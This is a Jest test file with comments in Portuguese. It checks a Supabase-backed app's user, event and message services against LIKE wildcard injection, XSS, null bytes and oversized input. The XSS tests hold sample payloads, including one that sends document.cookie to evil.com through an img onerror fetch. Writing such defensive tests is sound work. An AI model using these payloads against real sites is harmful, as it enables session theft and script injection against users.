/**
 * Testes de segurança: injection
 *
 * Cada teste espera o comportamento SEGURO.
 * Se o teste FALHAR, significa que o código tem uma vulnerabilidade real.
 */

jest.mock('@/app/lib/supabase/singleton', () => {
    const CHAIN = ['select', 'insert', 'update', 'delete', 'eq', 'neq', 'ilike', 'in', 'or', 'order', 'limit', 'single', 'maybeSingle'] as const
    const q: Record<string, jest.Mock> = {}
    CHAIN.forEach((m) => { q[m] = jest.fn().mockReturnValue(q) })
    q.single = jest.fn()
    q.maybeSingle = jest.fn()
    const client = { from: jest.fn().mockReturnValue(q), rpc: jest.fn() }
    return { getSupabaseClient: jest.fn(() => client), __mockClient: client, __mockQuery: q }
})

import { searchUsers } from '@/app/lib/services/database/userService'
import { searchEvents, createEvent } from '@/app/lib/services/database/eventService'
import { sendMessage } from '@/app/lib/services/database/messageService'

const { __mockClient: mockClient, __mockQuery: mockQuery } =
    jest.requireMock('@/app/lib/supabase/singleton')

function mockResolves(value: object) {
    ;(mockQuery as any).then = (resolve: Function) =>
        Promise.resolve(value).then(resolve as any)
}

beforeEach(() => {
    jest.clearAllMocks()
    mockClient.from.mockReturnValue(mockQuery)
    Object.values(mockQuery).forEach((m: any) => typeof m.mockReturnValue === 'function' && m.mockReturnValue(mockQuery))
    mockResolves({ data: [], error: null })
})

// ─── LIKE wildcard injection ──────────────────────────────────────────────────
// % e _ são wildcards do ILIKE. Se não forem escapados, um atacante consegue
// buscar todos os registros passando apenas "%".
// Comportamento seguro: escapar % → \% e _ → \_ antes de passar ao ilike.

describe('LIKE wildcard injection — searchUsers', () => {
    it('busca com "%" deve escapar o wildcard para não retornar todos os usuários', async () => {
        await searchUsers('%')

        // seguro: \% é tratado como caractere literal pelo Postgres
        expect(mockQuery.ilike).toHaveBeenCalledWith('username', '%\\%%')
    })

    it('busca com "_" deve escapar o wildcard para não casar com qualquer caractere', async () => {
        await searchUsers('_')

        expect(mockQuery.ilike).toHaveBeenCalledWith('username', '%\\_%')
    })

    it('busca com "%a%" deve escapar os wildcards extras da entrada do usuário', async () => {
        await searchUsers('%a%')

        expect(mockQuery.ilike).toHaveBeenCalledWith('username', '%\\%a\\%%')
    })
})

describe('LIKE wildcard injection — searchEvents', () => {
    it('busca com "%" deve escapar o wildcard para não retornar todos os eventos', async () => {
        await searchEvents('%')

        expect(mockQuery.ilike).toHaveBeenCalledWith('nome', '%\\%%')
    })

    it('busca com "%gratuito%" deve escapar os wildcards da entrada', async () => {
        await searchEvents('%gratuito%')

        expect(mockQuery.ilike).toHaveBeenCalledWith('nome', '%\\%gratuito\\%%')
    })
})

// ─── XSS via campos de texto ──────────────────────────────────────────────────
// O service não deve armazenar HTML cru no banco.
// Comportamento seguro: rejeitar (lançar erro) ou sanitizar antes de inserir.

describe('XSS via sendMessage', () => {
    it('script tag deve ser rejeitado ou sanitizado antes de inserir no banco', async () => {
        mockResolves({ data: null, error: null })

        await expect(
            sendMessage({
                conteudo: '<script>alert("xss")</script>',
                id_remetente: 'user-1',
                id_conversa: 'conv-1',
            })
        ).rejects.toThrow()
    })

    it('img onerror deve ser rejeitado ou sanitizado antes de inserir no banco', async () => {
        mockResolves({ data: null, error: null })

        await expect(
            sendMessage({
                conteudo: '<img src=x onerror=alert(1)>',
                id_remetente: 'user-1',
                id_conversa: 'conv-1',
            })
        ).rejects.toThrow()
    })

    it('javascript: URL deve ser rejeitado antes de inserir no banco', async () => {
        mockResolves({ data: null, error: null })

        await expect(
            sendMessage({
                conteudo: '<a href="javascript:alert(1)">clique</a>',
                id_remetente: 'user-1',
                id_conversa: 'conv-1',
            })
        ).rejects.toThrow()
    })
})

describe('XSS via createEvent', () => {
    const base = () => ({
        nome: 'Evento',
        endereco: { cep: '01310100', logradouro: 'Av. Paulista', numero: '1', bairro: 'Bela Vista', cidade: 'São Paulo', estado: 'SP' },
        vagas: 100,
        valor: 0,
        data_inicio: '2026-01-01',
        data_fim: '2026-01-02',
        hora_inicio: '10:00',
        hora_fim: '18:00',
        id_organizador: 'user-1',
    })

    it('script tag no nome do evento deve ser rejeitado ou sanitizado', async () => {
        mockResolves({ data: { id: 1 }, error: null })

        await expect(
            createEvent({ ...base(), nome: '<script>alert("xss")</script>' })
        ).rejects.toThrow()
    })

    it('payload de roubo de cookie na descrição deve ser rejeitado ou sanitizado', async () => {
        mockResolves({ data: { id: 1 }, error: null })

        await expect(
            createEvent({ ...base(), descricao: '<img src=x onerror=fetch("https://evil.com?c="+document.cookie)>' })
        ).rejects.toThrow()
    })
})

// ─── Null byte injection ───────────────────────────────────────────────────────
// Null bytes podem truncar strings em drivers C e causar bypass de filtros.
// Comportamento seguro: rejeitar strings com \x00.

describe('null byte injection', () => {
    it('null byte em searchUsers deve ser rejeitado antes de chegar ao banco', async () => {
        await expect(searchUsers('admin\x00')).rejects.toThrow()
    })

    it('null byte em conteúdo de mensagem deve ser rejeitado', async () => {
        mockResolves({ data: null, error: null })

        await expect(
            sendMessage({ conteudo: 'olá\x00mundo', id_remetente: 'user-1', id_conversa: 'conv-1' })
        ).rejects.toThrow()
    })
})

// ─── Limite de tamanho ────────────────────────────────────────────────────────
// Sem limite, um atacante pode enviar payloads gigantes para esgotar
// armazenamento ou derrubar queries.
// Comportamento seguro: rejeitar inputs acima de um tamanho razoável.

describe('inputs sem limite de tamanho', () => {
    it('username de 10.000 chars em searchUsers deve ser rejeitado', async () => {
        await expect(searchUsers('a'.repeat(10_000))).rejects.toThrow()
    })

    it('mensagem de 10.000 chars deve ser rejeitada', async () => {
        mockResolves({ data: null, error: null })

        await expect(
            sendMessage({ conteudo: 'x'.repeat(10_000), id_remetente: 'user-1', id_conversa: 'conv-1' })
        ).rejects.toThrow()
    })
})
